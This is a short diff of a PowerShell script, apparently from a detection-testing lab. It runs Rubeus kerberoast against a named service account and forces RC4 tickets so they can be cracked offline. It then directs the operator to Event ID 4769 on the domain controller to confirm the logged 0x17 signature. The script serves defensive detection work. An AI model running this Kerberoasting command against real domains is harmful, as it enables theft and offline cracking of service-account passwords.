@@ -34,9 +34,10 @@ if (-not (Test-Path $Rubeus)) {
     return
 }
 
-# /tgtdeleg + /rc4opsec: ep KDC cap ve RC4 (0x17) tren tai khoan co ho tro RC4, de crack offline nhanh.
-# Day la chu ky V1 bat (4769 + 0x17).
-& $Rubeus kerberoast /tgtdeleg /rc4opsec /spn:$Spn /nowrap | Out-Null
+# Chi dung /tgtdeleg de ha cap RC4 0x17 tren account co bat RC4. KHONG dung /rc4opsec
+# vi /rc4opsec loc BO cac account da bat AES (tuc la bo qua dung SVC_HIS_Database) -> khong sinh 0x17.
+# Kiem chung lai o Rubeus README truoc khi chay (muc kerberoast /tgtdeleg vs /rc4opsec).
+& $Rubeus kerberoast /tgtdeleg /spn:$Spn /nowrap | Out-Null
 
 Write-Host "    KET THUC: $(Get-Date -Format 'o')" -ForegroundColor Yellow
 Write-Host "[+] [SC2-2A] Xong. Kiem tra DC01 -> Security log -> Event ID 4769, TicketEncryptionType 0x17." -ForegroundColor Green
